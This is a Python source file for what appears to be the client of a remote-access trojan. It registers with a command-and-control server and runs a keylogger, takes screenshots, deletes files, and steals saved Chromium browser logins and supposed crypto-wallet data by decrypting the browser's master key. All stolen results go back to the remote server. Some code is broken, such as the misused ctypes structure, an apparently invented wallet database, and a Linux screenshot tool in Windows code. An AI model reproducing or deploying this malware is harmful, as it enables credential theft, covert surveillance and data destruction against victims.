# phantom_client.py

import requests
import json
import os
import base64
import subprocess
import socket
import platform
import psutil
import time
import ctypes
import ctypes.wintypes
import sqlite3
from Crypto.Cipher import AES, DES3
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

SERVER_URL = "https://your-c2-server.com:8443"   # use HTTPS
BOT_ID, SESSION_TOKEN = None, None

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(encrypted_data, key):
    iv = base64.b64decode(encrypted_data[:24])
    ct = base64.b64decode(encrypted_data[24:])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def get_system_info():
    return {
        "os": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "hostname": socket.gethostname()
    }

def send_registration():
    global BOT_ID, SESSION_TOKEN
    payload = get_system_info()
    r = requests.post(f"{SERVER_URL}/bot/register", json=payload, timeout=10)
    if r.ok:
        data = r.json()
        BOT_ID, SESSION_TOKEN = data["bot_id"], data["session_token"]
        return True
    print("Registration failed →", r.text); return False


def poll_command():
    headers = {"X-Session-Token": SESSION_TOKEN}
    r = requests.get(f"{SERVER_URL}/bot/command/{BOT_ID}", headers=headers, timeout=10)
    return r.json() if r.ok else {"status": "error", "error": r.text}


def send_result(cmd_id, result):
    headers = {"X-Session-Token": SESSION_TOKEN}
    r = requests.post(f"{SERVER_URL}/bot/result/{cmd_id}", json={"result": result},
                      headers=headers, timeout=10)
    if not r.ok:
        print("Result upload failed →", r.text)


def execute_command(command, args):
    try:
        if command == "keylogger":
            return start_keylogger(args)
        elif command == "screenshot":
            return capture_screenshot(args)
        elif command == "browser_logins":
            return steal_browser_logins(args)
        elif command == "browser_wallets":
            return steal_browser_wallets(args)
        elif command == "delete_file":
            return delete_file(args)
        else:
            return f"Unknown command: {command}"
    except Exception as e:
        return str(e)

def start_keylogger(args):
    keylogger_script = """import pythoncom
import pyHook
import win32api
import win32con
import win32gui
import time
import os

log_file = r'C:\\keylog.txt'

def on_keyboard_event(event):
    with open(log_file, 'a') as f:
        f.write(f'{event.Time}: {event.Key}\n')
    return True

hm = pyHook.HookManager()
hm.KeyDown = on_keyboard_event
hm.HookKeyboard()
pythoncom.PumpMessages()
"""
    with open("keylogger.py", "w") as f:
        f.write(keylogger_script)
    subprocess.Popen(["python", "keylogger.py"])
    return "Keylogger started"

def capture_screenshot(args):
    screenshot_path = args.get('path', 'screenshot.png')
    subprocess.run(["scrot", screenshot_path])
    return f"Screenshot captured at {screenshot_path}"

def steal_browser_logins(args):
    browser_paths = find_browser_paths()
    logins = []
    for browser, path in browser_paths.items():
        master_key = get_chromium_master_key(path)
        if master_key:
            logins.extend(get_chromium_logins(os.path.join(path, 'Login Data'), master_key))
    return logins

def steal_browser_wallets(args):
    browser_paths = find_browser_paths()
    wallets = []
    for browser, path in browser_paths.items():
        master_key = get_chromium_master_key(path)
        if master_key:
            wallets.extend(get_chromium_wallets(os.path.join(path, 'Wallet Data'), master_key))
    return wallets

def delete_file(args):
    file_path = args.get('path')
    if os.path.exists(file_path):
        os.remove(file_path)
        return f"File {file_path} deleted"
    else:
        return f"File {file_path} not found"

def main():
    if not send_registration():
        return
    while True:
        cmd = poll_command()
        if cmd.get("status") == "no_command":
            time.sleep(5); continue
        if "command" in cmd:
            res = execute_command(cmd["command"], cmd.get("args", {}))
            send_result(cmd["id"], res)
        time.sleep(2)


if __name__ == "__main__":
    main()

# Chromium Login and Wallet Stealer

DATA_BLOB = ctypes.Structure
DATA_BLOB._fields_ = [
    ('cbData', ctypes.wintypes.DWORD),
    ('pbData', ctypes.POINTER(ctypes.c_char))
]

def get_data(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = ctypes.c_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    ctypes.windll.kernel32.LocalFree(pbData)
    return buffer.raw

def crypt_unprotect_data(encrypted_bytes):
    buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_out = DATA_BLOB()

    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        return get_data(blob_out)
    else:
        return None

def get_chromium_master_key(browser_path):
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = f.read()

    try:
        print(f"Getting Chromium master key from {local_state_path}...")
        encrypted_key = base64.b64decode(local_state.split('"encrypted_key":"')[1].split('"')[0])
        encrypted_key = encrypted_key[5:]
        decrypted_key = crypt_unprotect_data(encrypted_key)
        return decrypted_key
    except Exception as e:
        print(f"Error getting Chromium master key: {e}")
        return None

def decrypt_password(buff, master_key):
    if buff.startswith(b'v10') or buff.startswith(b'v11'):
        return decrypt_aes(buff, master_key)
    elif buff.startswith(b'dc'):
        return decrypt_des(buff, master_key)
    else:
        return "N/A (Not encrypted with modern method)"

def decrypt_aes(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting AES password: {e}")
        return "Failed to decrypt"

def decrypt_des(buff, master_key):
    try:
        iv = buff[3:8]
        payload = buff[8:]
        cipher = DES3.new(master_key, DES3.MODE_CBC, iv)
        decrypted_pass = unpad(cipher.decrypt(payload), 8).decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting DES password: {e}")
        return "Failed to decrypt"

def find_browser_paths():
    paths = {}
    user_profile = os.path.expanduser('~')
    app_data = os.path.join(user_profile, 'AppData')

    browser_definitions = {
        'chrome': os.path.join(app_data, 'Local', 'Google', 'Chrome', 'User Data'),
        'edge': os.path.join(app_data, 'Local', 'Microsoft', 'Edge', 'User Data'),
        'opera': os.path.join(app_data, 'Roaming', 'Opera Software', 'Opera Stable'),
        'firefox_profiles': os.path.join(app_data, 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
    }

    for browser, path in browser_definitions.items():
        if browser != 'firefox_profiles' and os.path.exists(os.path.join(path, 'Default')):
            paths[browser] = os.path.join(path, 'Default')

    if os.path.exists(browser_definitions['firefox_profiles']):
        for profile in os.listdir(browser_definitions['firefox_profiles']):
            if '.default-release' in profile:
                paths['firefox'] = os.path.join(browser_definitions['firefox_profiles'], profile)
                break

    return paths

def get_chromium_logins(db_path, master_key, retries=3, delay=2):
    if not os.path.exists(db_path) or not master_key:
        return []

    temp_db_path = os.path.join(os.environ["TEMP"], "LoginData.db")
    for attempt in range(retries):
        try:
            manual_copy_with_admin(db_path, temp_db_path)
            break
        except PermissionError as e:
            print(f"PermissionError: {e}. Retrying in {delay} seconds... ({retries - attempt - 1} attempts left)")
            time.sleep(delay)
    else:
        print(f"Failed to copy logins file after {retries} attempts.")
        return []

    results = []
    try:
        print(f"Getting Chromium logins from {db_path}...")
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, encrypted_password in cursor.fetchall():
            password = decrypt_password(encrypted_password, master_key)
            if username and password:
                results.append({"url": url, "username": username, "password": password})
        conn.close()
        os.remove(temp_db_path)
    except Exception as e:
        print(f"Error getting Chromium logins: {e}")
    return results

def get_chromium_wallets(db_path, master_key, retries=3, delay=2):
    if not os.path.exists(db_path) or not master_key:
        return []

    temp_db_path = os.path.join(os.environ["TEMP"], "WalletData.db")
    for attempt in range(retries):
        try:
            manual_copy_with_admin(db_path, temp_db_path)
            break
        except PermissionError as e:
            print(f"PermissionError: {e}. Retrying in {delay} seconds... ({retries - attempt - 1} attempts left)")
            time.sleep(delay)
    else:
        print(f"Failed to copy wallets file after {retries} attempts.")
        return []

    results = []
    try:
        print(f"Getting Chromium wallets from {db_path}...")
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, crypto_wallet, crypto_wallet_address, crypto_wallet_extra_info FROM wallets")
        for url, crypto_wallet, crypto_wallet_address, crypto_wallet_extra_info in cursor.fetchall():
            if crypto_wallet and crypto_wallet_address:
                results.append({"url": url, "crypto_wallet": crypto_wallet, "crypto_wallet_address": crypto_wallet_address, "crypto_wallet_extra_info": crypto_wallet_extra_info})
        conn.close()
        os.remove(temp_db_path)
    except Exception as e:
        print(f"Error getting Chromium wallets: {e}")
    return results

def manual_copy_with_admin(src, dst):
    import shutil
    shutil.copy2(src, dst)
